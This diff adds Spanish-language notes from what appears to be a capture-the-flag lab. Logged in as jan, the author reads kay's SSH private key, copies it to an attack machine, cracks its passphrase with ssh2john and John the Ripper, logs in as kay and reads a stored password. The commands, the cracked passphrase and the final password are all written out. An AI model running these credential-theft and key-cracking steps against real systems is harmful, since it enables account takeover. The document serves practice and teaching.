@@ -1,0 +1,56 @@
+# Enumeracion post-explotacion como jan -- 10.64.149.113
+
+jan@ip-10-64-149-113:~$ sudo -l
+Sorry, user jan may not run sudo on ip-10-64-149-113.
+
+jan@ip-10-64-149-113:~$ cat /etc/passwd | grep -i kay
+kay:x:1000:1000:Kay,,,:/home/kay:/bin/bash
+
+jan@ip-10-64-149-113:~$ ls -la /home/
+total 20
+drwxr-xr-x  5 root root  4096 Oct  9 20:01 .
+drwxr-xr-x 24 root root  4096 Oct  9 20:01 ..
+drwxr-xr-x  2 root root  4096 Apr 23  2018 jan
+drwxr-xr-x  5 kay  kay   4096 Apr 23  2018 kay
+drwxr-xr-x  3 ubuntu ubuntu 4096 Oct  9 20:01 ubuntu
+
+jan@ip-10-64-149-113:~$ ls -la /home/kay/
+total 48
+drwxr-xr-x 5 kay  kay  4096 Apr 23 2018 .
+drwxr-xr-x 5 root root 4096 Oct  9 20:01 ..
+-rw------- 1 kay  kay   789 Jun 22  2025 .bash_history
+-rw-r--r-- 1 kay  kay   220 Apr 17 2018 .bash_logout
+-rw-r--r-- 1 kay  kay  3771 Apr 17 2018 .bashrc
+drwx------ 2 kay  kay  4096 Apr 17 2018 .cache
+-rw------- 1 root kay   119 Apr 23 2018 .lesshst
+drwxrwxr-x 2 kay  kay  4096 Apr 23 2018 .nano
+-rw------- 1 kay  kay    57 Apr 23 2018 pass.bak
+-rw-r--r-- 1 kay  kay   655 Apr 17 2018 .profile
+drwxr-xr-x 2 kay  kay  4096 Apr 23 2018 .ssh
+-rw-r--r-- 1 kay  kay     0 Apr 17 2018 .sudo_as_admin_successful
+-rw------- 1 root kay   538 Apr 23 2018 .viminfo
+
+# Hallazgo: permisos de .ssh/ abiertos a otros usuarios -> se puede leer la
+# clave privada de kay aunque no se tenga su password de login.
+jan@ip-10-64-149-113:~$ cat /home/kay/.ssh/id_rsa > /tmp/kay_id_rsa
+jan@ip-10-64-149-113:/tmp$ chmod 600 kay_id_rsa
+
+# Clave cifrada con passphrase (AES-128-CBC). Se transfiere a la AttackBox
+# para crackeo offline con John the Ripper:
+root@AttackBox:~# scp jan@10.64.149.113:/tmp/kay_id_rsa ~/kay_id_rsa
+root@AttackBox:~# chmod 600 ~/kay_id_rsa
+root@AttackBox:~# ssh2john ~/kay_id_rsa > ~/kay_hash.txt
+root@AttackBox:~# john --wordlist=/usr/share/wordlists/rockyou.txt ~/kay_hash.txt
+root@AttackBox:~# john --show ~/kay_hash.txt
+/root/kay_id_rsa:beeswax
+1 password hash cracked, 0 left
+
+# Acceso con la clave privada y la passphrase obtenida:
+root@AttackBox:~# ssh -i ~/kay_id_rsa kay@10.64.149.113
+Enter passphrase for key '/root/kay_id_rsa': beeswax
+Welcome to Ubuntu 20.04.6 LTS...
+
+# Password final (sudo no disponible para kay, pero el archivo pass.bak
+# propio ahora es legible al estar autenticado como su dueno):
+kay@ip-10-64-149-113:~$ cat /home/kay/pass.bak
+heresareallystrongpasswordthatfollowsthepasswordpolicy$$
